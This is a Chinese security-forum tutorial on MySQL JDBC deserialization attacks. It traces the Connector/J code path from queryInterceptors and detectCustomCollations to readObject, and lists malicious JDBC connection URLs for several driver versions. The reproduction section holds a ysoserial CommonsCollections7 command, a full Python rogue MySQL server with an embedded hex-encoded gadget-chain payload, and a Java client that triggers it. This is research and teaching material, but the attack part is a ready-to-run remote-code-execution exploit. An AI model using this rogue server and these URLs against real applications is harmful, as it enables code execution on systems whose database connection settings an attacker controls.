# Java安全 - Mysql-JDBC反序列化

> **来源**: https://forum.butian.net/share/2872  
> **文章ID**: 2872

---

JDBC 反序列化
=========

JDBC（Java DataBase Connectivity）是Java和数据库之间的一个桥梁，是一个 规范 而不是一个实现，能够执行SQL语句

简单demo

```java
String Driver = "com.mysql.cj.jdbc.Driver"; //从 mysql-connector-java 6开始
String DB_URL="jdbc:mysql://127.0.0.1:3306/security";
//1.加载启动
Class.forName(Driver);
//2.建立连接
Connection conn = DriverManager.getConnection(DB_URL,"root","root");
//3.操作数据库，实现增删改查
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("select * from users");
//如果有数据，rs.next()返回true
while(rs.next()){
  System.out.println(rs.getString("id")+" : "+rs.getString("username"));
}
```

前提
--

1. Jdbc可控且目标机器出网。
2. 存在反序列化漏洞链。

原理
--

如果攻击者能够控制JDBC连接设置项，那么就可以通过设置其指向恶意MySQL服务器进行ObjectInputStream.readObject()的反序列化攻击从而RCE。

漏洞分析
----

一共两条触发链子，也可以说是 就两个sql语句

- `SHOW SESSION STATUS`​
- `SHOW COLLATION`​

### 这里有几个前置知识补充一下

- BLOB为二进制形式的长文本数据
- BIT类型(Bit数据类型用来存储bit值)数据
- queryInterceptors:一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query”之间”进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）
- autoDeserialize:自动检测与反序列化存在BLOB字段中的对象

‍

这里最重点和最巧妙的就是这个`queryInterceptors`​ 参数，直接看文字感觉有点迷，听我解释：

它允许你指定一个或多个实现了 `com.mysql.cj.interceptors.QueryInterceptor`​ 接口的类。这些类的目的是在执行 SQL 查询前后进行拦截和操纵，你完全可以理解为，只要JDBC带上了这个，在执行SQL语句前 和 后 他就会有一层类似的`Filter`​，默认调用其 预处理`preProcess`​ 和后处理`postProcess`​等方法！！！(实在不懂就需要参考一下java mysql connect的官方连接手册)

‍

### ServerStatusDiffInterceptor触发payload

依赖

```xml

    mysql
    mysql-connector-java
    8.0.13

```

这里先不看poc 为啥？因为poc看了也不知道为啥报错，所以先从作者的角度来触发

首先作者也是常规思路，先去找了`readObject`​方法，发现在 `com.mysql.cj.jdbc.result.ResultSetImpl.getObject()`​ 这里找到以下代码

```java
public Object getObject(int columnIndex) throws SQLException {
        try {
            this.checkRowPos();
            this.checkColumnBounds(columnIndex);
            int columnIndexMinusOne = columnIndex - 1;
            if (this.thisRow.getNull(columnIndexMinusOne)) {
                return null;
            } else {
                Field field = this.columnDefinition.getFields()[columnIndexMinusOne];
                switch (field.getMysqlType()) {
                     //判断数据是不是bit类型或者blob类型
                    case BIT: 
                        if (!field.isBinary() && !field.isBlob()) {
                            return field.isSingleBit() ? this.getBoolean(columnIndex) : this.getBytes(columnIndex);
                        } else {
                            byte[] data = this.getBytes(columnIndex);
                            if (!(Boolean)this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) {
                                //获取连接属性的autoDeserialize是否为true
                                return data;
                            } else {
                                Object obj = data;
                                if (data != null && data.length >= 2) { //data长度大于等于2
                                    if (data[0] != -84 || data[1] != -19) {
                                        // Serialized object 识别是否为序列化后的对象
                                        return this.getString(columnIndex);
                                    }
                                    // 如果是java的序列化对象，则进入以下逻辑进行反序列化
                                    try {
                                        ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
                                        ObjectInputStream objIn = new ObjectInputStream(bytesIn);
                                        obj = objIn.readObject();
                                        objIn.close();
                                        bytesIn.close();
                                    } catch (ClassNotFoundException var13) {
                                        throw SQLError.createSQLException(Messages.getString("ResultSet.Class_not_found___91") + var13.toString() + Messages.getString("ResultSet._while_reading_serialized_object_92"), this.getExceptionInterceptor());
                                    } catch (IOException var14) {
                                        obj = data;
                                    }
                                }

                                return obj;
                            }
                        }
                    case BOOLEAN:
                        return this.getBoolean(columnIndex);
                    case TINYINT:
                        return Integer.valueOf(this.getByte(columnIndex));

                    case BLOB:
                        if (!field.isBinary() && !field.isBlob()) {
                            return this.getBytes(columnIndex);
                        } else {
                            byte[] data = this.getBytes(columnIndex);
                            if (!(Boolean)this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) {
                                return data;
                            } else {
                                Object obj = data;
                                if (data != null && data.length >= 2) {
                                    if (data[0] != -84 || data[1] != -19) {
                                        return this.getString(columnIndex);
                                    }

                                    try {
                                        ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
                                        ObjectInputStream objIn = new ObjectInputStream(bytesIn);
                                        obj = objIn.readObject();
                                        objIn.close();
                                        bytesIn.close();
                                    } catch (ClassNotFoundException var10) {
                                        throw SQLError.createSQLException(Messages.getString("ResultSet.Class_not_found___91") + var10.toString() + Messages.getString("ResultSet._while_reading_serialized_object_92"), this.getExceptionInterceptor());
                                    } catch (IOException var11) {
                                        obj = data;
                                    }
                                }

                                return obj;
                            }
                        }

```

这里后半段省略了因为没啥作用 相关的代码内容在代码块中已经解释了 总的来说其实就是 如果判断出是否为bit类型or blob类型，如果是bit类型的话就去判断连接的属性，然后如果传入的是一个序列化的字节，则进行readobject反序列化

‍

那么这里其实很容易理解，那么再次按照作者的思路，去找哪个地方调用了 `getobject()`​方法

‍

于是找到了 `com.mysql.cj.jdbc.util.ResultSetUtil.resultSetToMap()`​方法

![image](images/attach-76f1af79c8d1af5f70d7104f06ce7983a0b483b4.png)​

那么再去追溯一下谁调用了`resultSetToMap`​ 就可以找到`com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues()`​ 方法

![image](images/attach-4909ea014226c4f71d0c34307847f2b0b6b16ca5.png)​

那么谁去触发这个`com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues()`​ 方法 就是该类下的 `preProcess`​ 方法

![image](images/attach-15a5dc34b5b57fee42b0e041a439d507f6449f74.png)​

‍

#### 小结

那么整条链子就很清晰了 从MySQL服务端获取到字节码数据后，判断autoDeserialize是否为true、字节码数据是否为序列化对象等，最后调用readObject()触发反序列化漏洞

在mysql的getconnect过程中会去触发一系列函数从而触发我们手动配置的queryInterceptors(可以类比于一个拦截查询器)进行一个SQL Query的查询，其中在以上代码分析当中可以看出如果查询拦截器不为空，则调用的查询拦截器的`preProcess()`​方法，然后进入到`preProcess()`​该方法后执行了 `SHOW SESSION STATUS`​ ,然后把返回来的结果(此时这个sql查询是已经在恶意的mysql中返回的结果)，调用了`resultSetToMap()`​方法然后把返回的结果传进去，该函数中就调用了触发反序列化漏洞的getObject()函数(注意columnIndex为2处才能走到反序列化的代码逻辑，因为为1则直接返回null)

‍

MySQL JDBC客户端在开始连接MySQL服务端时，会执行一些如`set autocommit=1`​ 等SQL Query，其中会触发我们所配置的queryInterceptors中的preProcess()函数，在该函数逻辑中、当MySQL字段类型为BLOB时，会对数据进行反序列化操作，因此只要保证第1或第2字段为BLOB类型且存储了恶意序列化数据即可触发反序列化漏洞。

‍

最终这条链子的payload如下

```java
(1) MYSQL8.x:

jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc

(2) MYSQL6.x(属性名不同):

jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc

(3) MYSQL5.1.11及以上的5.x版本(包名改了):

jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc

(4) MYSQL5.1.10及以下的5.1.X版本: 同上，但是需要连接后执行查询。

(5) MYSQL5.0.x: 还没有ServerStatusDiffInterceptor。
```

### detectCustomCollations触发payload

依赖

```xml

    mysql
    mysql-connector-java
    5.1.29

```

其实这个链子跟上述是一样的

漏洞的触发点是在 `com.mysql.cj.jdbc.ConnectionImpl#buildCollationMapping()`​

![image](images/attach-3bfd75c3af65576a3825ec6fdf2c5b8f98e56a88.png)​

在服务器版本大于等于4.1.0且detectCustomCollations选项为true的情况下，可以获取`SHOW COLLATION`​的结果，当依赖满足大于5.0.0就会将查询结果带进Util.resultSetToMap方法，那么在执行这个SQL query就会把 `SHOW COLLATION`​ 的结果传入到上述的 `resultSetToMap`​ 方法中去触发我们的readobject方法造成反序列化

‍

最终这条链子的payload如下

```java
(1) MYSQL5.1.41及以上: 不可用

(2) MYSQL5.1.29-5.1.40:

jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc

(3) MYSQL5.1.28-5.1.19:

jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso_JRE8u20_calc

(4) MYSQL5.1.18以下的5.1.x版本: 不可用

(5) MYSQL5.0.x版本: 不可用
```

漏洞复现
----

首先利用到的恶意mysql是 [https://github.com/fnmsd/MySQL\_Fake\_Server](https://github.com/fnmsd/MySQL_Fake_Server)

这是一个可以方便的辅助MySQL客户端文件读取和提供MySQL JDBC反序列化漏洞所需序列化数据的假服务器

现在这个python目录下生成yso的payload

```java
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 calc > payload
```

恶意的mysql

```python
# coding=utf-8
import socket
import binascii
import os

greeting_data="4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"
response_ok_data="0700000200000002000000"

def receive_data(conn):
    data = conn.recv(1024)
    print("[*] Receiveing the package : {}".format(data))
    return str(data).lower()

def send_data(conn,data):
    print("[*] Sending the package : {}".format(data))
    conn.send(binascii.a2b_hex(data))

def get_payload_content():
    #file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] > payload
    file= r'payload'
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')
        print("open successs")

    else:
        print("open false")
        #calc
        payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'
    return payload_content

# 主要逻辑
def run():

    while 1:
        conn, addr = sk.accept()
        print("Connection come from {}:{}".format(addr[0],addr[1]))

        # 1.先发送第一个 问候报文
        send_data(conn,greeting_data)

        while True:
            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok
            receive_data(conn)
            send_data(conn,response_ok_data)

            #其他过程
            data=receive_data(conn)
            #查询一些配置信息,其中会发送自己的 版本号
            if "session.auto_increment_increment" in data:
                _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
                send_data(conn,_payload)
                data=receive_data(conn)
            elif "show warnings" in data:
                _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
                send_data(conn, _payload)
                data = receive_data(conn)
            if "set names" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "set character_set_results" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "show session status" in data:
                mysql_data = '0100000102'
                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
                # 为什么我加了EOF Packet 就无法正常运行呢？？
                # 获取payload
                payload_content=get_payload_content()
                # 计算payload长度
                payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
                payload_length_hex = payload_length[2:4] + payload_length[0:2]
                # 计算数据包长度
                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
                mysql_data += str(payload_content)
                mysql_data += '07000005fe000022000100'
                send_data(conn, mysql_data)
                data = receive_data(conn)
            if "show warnings" in data:
                payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
                send_data(conn, payload)
            break

if __name__ == '__main__':
    HOST ='0.0.0.0'
    PORT = 3307

    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk.bind((HOST, PORT))
    sk.listen(1)

    print("start fake mysql server listening on {}:{}".format(HOST,PORT))

    run()
```

然后客户端mysql

```java
package org.example;

import java.sql.*;

public class Test {
    public static void main(String[] args) throws Exception {
        Class.forName("com.mysql.jdbc.Driver");
        String jdbc_url = "jdbc:mysql://127.0.0.1:3307/test?" +
                "autoDeserialize=true" +
                "&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";
        Connection con = DriverManager.getConnection(jdbc_url, "root", "root");
    }
}
```

‍

![image](images/attach-15125f71fefbded2407edd62439996c05acc93c0.png)​

‍

参考文章

- <https://xz.aliyun.com/t/8159>
- <https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E5%B0%8F%E7%BB%93>
- <https://www.anquanke.com/post/id/203086>

‍

‍

‍
